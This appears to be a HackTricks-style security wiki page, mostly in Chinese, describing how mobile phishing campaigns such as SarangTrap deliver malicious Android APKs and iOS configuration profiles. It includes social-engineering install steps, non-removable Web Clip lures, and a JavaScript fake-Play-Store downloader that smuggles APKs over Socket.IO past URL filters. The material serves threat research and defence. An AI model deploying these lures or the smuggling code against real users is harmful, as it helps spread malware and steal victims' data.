# Mobile Phishing & Malicious App Distribution (Android & iOS)

> [!INFO]
> 本页面介绍威胁行为者通过 phishing（SEO、social engineering、fake stores、dating apps 等）分发**恶意 Android APK**和**iOS mobile-configuration profiles**所使用的技术。
> 内容改编自 Zimperium zLabs（2025 年）披露的 SarangTrap campaign 及其他公开研究。<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
* 注册数十个相似域名（dating、cloud share、car service……）。
– 在 `<title>` 元素中使用本地语言关键词和 emoji，以提高 Google 排名。
– 在同一 landing page 上同时托管 Android（`.apk`）和 iOS 安装说明。
2. **First Stage Download**
* Android：直接链接到*未签名*或“third-party store” APK。
* iOS：使用 `itms-services://` 或普通 HTTPS 链接，指向恶意 **mobileconfig** profile（见下文）。
3. **Android Post-install Behaviour**
* C2-gated execution、permission abuse、dropper bypasses、background collection 以及其他 post-install malware 行为，详见下方专门的 Android Malware Post-Exploitation 页面。
4. **iOS Delivery Technique**
* 单个 **mobile-configuration profile** 可以请求 `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` 等内容，以类似“MDM”的 supervision 方式注册设备。
* Social-engineering instructions：
1. 打开 Settings ➜ *Profile downloaded*。
2. 点击 *Install* 三次（phishing page 上提供 screenshots）。
3. Trust the unsigned profile ➜ attacker 在无需 App Store review 的情况下获得 *Contacts* 和 *Photo* entitlement。
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads 可以将 **phishing URL 固定到 Home Screen**，并设置 branded icon/label。
* Web Clips 可以以**全屏**运行（隐藏 browser UI），并标记为**不可移除**，迫使受害者删除 profile 才能移除该图标。<sup>[[3]](#references)</sup>
6. **Network Layer**
* 普通 HTTP，通常使用端口 80，并设置类似 `api.<phishingdomain>.com` 的 HOST header。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（无 TLS → 很容易被发现）。

## Android Malware Post-Exploitation

有关 C2、Accessibility abuse、overlays、ATS automation、staged DEX loading、premium SMS 和 persistence 等 post-install Android malware tradecraft，请参阅下方页面：

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

攻击者越来越多地使用嵌入 Google Play 外观诱饵中的 Socket.IO/WebSocket channel，替代静态 APK 链接。这样可以隐藏 payload URL，绕过 URL/extension filters，并保留逼真的 install UX。<sup>[[2]](#references)[[4]](#references)</sup>

在实际攻击中观察到的典型 client flow：

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

它为何能绕过简单的控制措施：
- 不会暴露静态 APK URL；payload 会根据 WebSocket frames 在内存中重建。
- 会拦截直接 `.apk` 响应的 URL/MIME/extension filters，可能无法识别通过 WebSockets/Socket.IO 隧道传输的 binary data。
- 不执行 WebSockets 的 crawlers 和 URL sandboxes 不会获取 payload。

另请参阅 WebSocket 技术和工具：

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Romance 的黑暗面：SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple 设备的 Web Clips payload 设置](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [针对印度尼西亚和越南 Android 用户的 Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
